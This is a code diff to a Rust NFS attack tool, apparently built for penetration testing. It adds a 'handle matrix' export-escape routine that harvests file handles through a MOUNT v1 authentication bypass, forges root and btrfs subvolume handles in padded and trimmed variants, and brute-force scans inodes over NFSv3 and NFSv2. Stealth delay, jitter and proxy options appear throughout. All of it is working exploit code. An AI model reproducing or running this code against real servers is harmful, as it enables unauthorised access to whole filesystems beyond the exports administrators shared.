@@ -13,9 +13,9 @@
 use clap::Parser;
 use colored::Colorize as _;
 
-use crate::cli::probe::{make_client_with_hostname, make_mount_client, make_v2_client_with_hostname, parse_addr_with_port};
+use crate::cli::probe::{acquire_and_test_handles, make_client_with_hostname, make_mount_client, make_v2_client_with_hostname, parse_addr_with_port};
 use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
-use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer};
+use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer, dedup_variants, derive_handle_variants};
 use crate::proto::auth::{AuthSys, Credential};
 use crate::proto::nfs3::types::FileHandle;
 use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
@@ -150,47 +150,45 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
         return Ok(());
     }
 
-    // Try NFSv3 first; fall back to NFSv2 if MOUNT v3 fails.
+    // Try NFSv3 first; if MOUNT v3 fails, try the handle matrix (MOUNT v1
+    // handle with v3 ops, padded/trimmed variants), then fall back to NFSv2.
     let result = find_escape(host, export, btrfs_subvols, max_root_scan, globals, true).await;
     let (probe_client, outcome) = match result {
         Ok(r) => r,
         Err(v3_err) => {
-            eprintln!("{}", crate::output::status_info("MOUNT v3 failed; trying NFSv2 escape"));
-            let outcome = match find_escape_v2(host, export, max_root_scan, globals).await {
-                Ok(o) => o,
-                Err(v2_err) => {
-                    eprintln!("{}", crate::output::status_err("MOUNT failed on both v3 and v1 -- export may not exist or server is unreachable"));
-                    eprintln!("  v3: {v3_err}");
-                    eprintln!("  v1: {v2_err}");
-                    return Ok(());
-                },
-            };
-            match outcome {
-                EscapeOutcome::Success { candidate, note } => {
-                    print_escape_success(&candidate, &note, host);
-                },
-                EscapeOutcome::WebNfs { public_handle, version } => {
-                    print_webnfs_success(&public_handle, version, host);
-                },
-                EscapeOutcome::Nfs4Lookupp { root_handle } => {
-                    print_nfs4_lookupp_success(&root_handle, host);
-                },
-                EscapeOutcome::StaleNoRoot | EscapeOutcome::Unsupported => {
-                    // v2 handle construction failed -- try v4 LOOKUPP as last resort.
-                    if let Some(v4_outcome) = try_nfs4_escape(host, globals).await {
-                        if let EscapeOutcome::Nfs4Lookupp { ref root_handle } = v4_outcome {
-                            print_nfs4_lookupp_success(root_handle, host);
+            // Handle matrix: acquire v1+v3 handles, derive all length variants,
+            // test root candidates from each seed against v3 + v2 GETATTR.
+            if let Some(r) = find_escape_matrix(host, export, btrfs_subvols, max_root_scan, globals, true).await {
+                r
+            } else {
+                // Matrix found nothing -- fall back to pure v2 path.
+                eprintln!("{}", crate::output::status_info("MOUNT v3 failed; trying NFSv2 escape"));
+                match find_escape_v2(host, export, max_root_scan, globals).await {
+                    Ok(o) => {
+                        match &o {
+                            EscapeOutcome::Success { candidate, note } => print_escape_success(candidate, note, host),
+                            EscapeOutcome::WebNfs { public_handle, version } => print_webnfs_success(public_handle, version, host),
+                            EscapeOutcome::Nfs4Lookupp { root_handle } => print_nfs4_lookupp_success(root_handle, host),
+                            EscapeOutcome::StaleNoRoot => eprintln!("{}", crate::output::status_err(&format!("NFSv2: handle format valid (STALE) but root not found in inodes 2..={max_root_scan}."))),
+                            EscapeOutcome::Unsupported => eprintln!("{}", crate::output::status_err("NFSv2: handle format rejected or export is already the filesystem root.")),
                         }
                         return Ok(());
-                    }
-                    if matches!(outcome, EscapeOutcome::StaleNoRoot) {
-                        eprintln!("{}", crate::output::status_err(&format!("NFSv2: handle format valid (STALE) but root not found in inodes 2..={max_root_scan}.")));
-                    } else {
-                        eprintln!("{}", crate::output::status_err("NFSv2: handle format rejected or export is already the filesystem root."));
-                    }
-                },
+                    },
+                    Err(v2_err) => {
+                        // All MOUNT-based paths failed -- try v4 LOOKUPP as last resort.
+                        if let Some(v4) = try_nfs4_escape(host, globals).await {
+                            if let EscapeOutcome::Nfs4Lookupp { ref root_handle } = v4 {
+                                print_nfs4_lookupp_success(root_handle, host);
+                            }
+                            return Ok(());
+                        }
+                        eprintln!("{}", crate::output::status_err("MOUNT failed on both v3 and v1 -- export may not exist or server is unreachable"));
+                        eprintln!("  v3: {v3_err}");
+                        eprintln!("  v1: {v2_err}");
+                        return Ok(());
+                    },
+                }
             }
-            return Ok(());
         },
     };
 
@@ -233,12 +231,16 @@ pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32
     }
     let outcome = match find_escape(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
         Ok((_client, o)) => o,
-        Err(_) => match find_escape_v2(host, export, max_root_scan, globals).await {
-            Ok(o) => o,
-            Err(_) => {
-                // Both MOUNT protocols failed -- try NFSv4 LOOKUPP (no MOUNT needed).
-                return Ok(try_nfs4_escape(host, globals).await.unwrap_or(EscapeOutcome::Unsupported));
-            },
+        Err(_) => {
+            // Handle matrix: try v1+v3 handles with all length variants.
+            if let Some((_client, o)) = find_escape_matrix(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
+                o
+            } else {
+                match find_escape_v2(host, export, max_root_scan, globals).await {
+                    Ok(o) => o,
+                    Err(_) => return Ok(try_nfs4_escape(host, globals).await.unwrap_or(EscapeOutcome::Unsupported)),
+                }
+            }
         },
     };
 
@@ -739,6 +741,110 @@ fn print_nfs4_lookupp_success(root_handle: &FileHandle, host: &str) {
     crate::output::print_handle("Root handle", &hex);
     crate::output::print_handle_next_steps(&hex, host);
     println!();
+}
+
+/// Handle-matrix escape: acquire handles via MOUNT v1+v3, derive all
+/// length variants (raw/trimmed/pad32/pad64), and test root candidates
+/// from every viable seed against both NFSv3 and NFSv2 GETATTR.
+///
+/// This catches the F-1.6 case where MOUNT v3 denies access (sec=krb5)
+/// but MOUNT v1 leaks the handle, which then works with NFSv3 ops.
+async fn find_escape_matrix(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> Option<(Nfs3Client, EscapeOutcome)> {
+    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
+    let mount = make_mount_client(globals);
+    let stealth = StealthConfig::new(globals.delay, globals.jitter);
+    let (_, _, nfs3) = make_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+
+    let probe = acquire_and_test_handles(&mount, &nfs3, addr, export, &stealth, globals.nfs_port, globals.proxy.as_deref(), &globals.hostname).await;
+
+    if probe.v1_bypass && announce {
+        eprintln!("{}", crate::output::status_warn("MOUNT v3 denied; MOUNT v1 leaked handle (F-1.6 auth bypass) -- testing cross-version handle reuse"));
+    }
+
+    let seeds = probe.escape_seeds();
+    if seeds.is_empty() {
+        return None;
+    }
+
+    // For each seed, construct root candidates and test them.
+    // Test each root candidate in all length variants against v3 + v2.
+    for seed_th in &seeds {
+        let seed = &seed_th.variant.handle;
+
+        if export_is_fs_root(&nfs3, seed).await {
+            continue;
+        }
+
+        let export_fileid: Option<u64> = nfs3.attrs(seed).await.ok().map(|a| a.fileid);
+
+        // Phase 1: known root candidates from this seed
+        let known = FileHandleAnalyzer::construct_root_candidates(seed);
+        let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(seed, btrfs_subvols);
+
+        for candidate in known.iter().chain(btrfs.iter()) {
+            if announce {
+                tracing::debug!(seed = %seed_th.variant.label, fs = ?candidate.fs_type, inode = candidate.inode_number, "probing root candidate");
+            }
+
+            // Derive all length variants of the root candidate handle
+            let mut root_variants = derive_handle_variants(&candidate.root_handle, "root");
+            dedup_variants(&mut root_variants);
+
+            for rv in &root_variants {
+                // Try NFSv3 GETATTR
+                stealth.wait().await;
+                match nfs3.attrs(&rv.handle).await {
+                    Ok(a) if a.file_type == FileType::Directory => {
+                        if export_fileid.is_none_or(|exp| a.fileid != exp) {
+                            let note = format!("verified (matrix: seed={}, root_variant={})", seed_th.variant.label, rv.label);
+                            return Some((nfs3, EscapeOutcome::Success { candidate: EscapeResult { root_handle: rv.handle.clone(), ..candidate.clone() }, note }));
+                        }
+                    },
+                    Err(ref e) if e.is_permission_denied() && confirm_root_dir(&nfs3, &EscapeResult { root_handle: rv.handle.clone(), ..candidate.clone() }).await => {
+                        let note = format!("confirmed root (matrix: seed={}, root_variant={}, root_squash active)", seed_th.variant.label, rv.label);
+                        return Some((nfs3, EscapeOutcome::Success { candidate: EscapeResult { root_handle: rv.handle.clone(), ..candidate.clone() }, note }));
+                    },
+                    _ => {},
+                }
+
+                // Try NFSv2 GETATTR on 32-byte variants
+                if rv.handle.as_bytes().len() == 32 {
+                    stealth.wait().await;
+                    let v2_fh = nfs_v2::wire::Nfs2FileHandle::from_bytes(rv.handle.as_bytes());
+                    let v2_stealth = StealthConfig::new(globals.delay, globals.jitter);
+                    let (_, _, v2_client) = make_v2_client_with_hostname(addr, export, 0, 0, &[], v2_stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+                    if let Ok(a) = v2_client.getattr(&v2_fh).await
+                        && a.ftype == nfs_v2::wire::FType::Directory
+                    {
+                        let note = format!("verified via NFSv2 (matrix: seed={}, root_variant={})", seed_th.variant.label, rv.label);
+                        return Some((nfs3, EscapeOutcome::Success { candidate: EscapeResult { root_handle: rv.handle.clone(), ..candidate.clone() }, note }));
+                    }
+                }
+            }
+        }
+
+        // Phase 2: inode scan with this seed
+        for inode in 2..=max_root_scan {
+            let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode, 0) else { continue };
+            stealth.wait().await;
+            match nfs3.attrs(&candidate.root_handle).await {
+                Ok(a) if a.file_type == FileType::Directory => {
+                    let self_id = a.fileid;
+                    if export_fileid.is_none_or(|exp| self_id != exp) && scan_hit_is_root(&nfs3, &candidate.root_handle, self_id).await {
+                        let note = format!("found via scan (matrix: seed={})", seed_th.variant.label);
+                        return Some((nfs3, EscapeOutcome::Success { candidate, note }));
+                    }
+                },
+                Err(ref e) if e.is_permission_denied() && confirm_root_dir(&nfs3, &candidate).await => {
+                    let note = format!("found via scan (matrix: seed={}, root_squash active)", seed_th.variant.label);
+                    return Some((nfs3, EscapeOutcome::Success { candidate, note }));
+                },
+                _ => {},
+            }
+        }
+    }
+
+    None
 }
 
 /// NFSv2 escape path for v2-only servers.
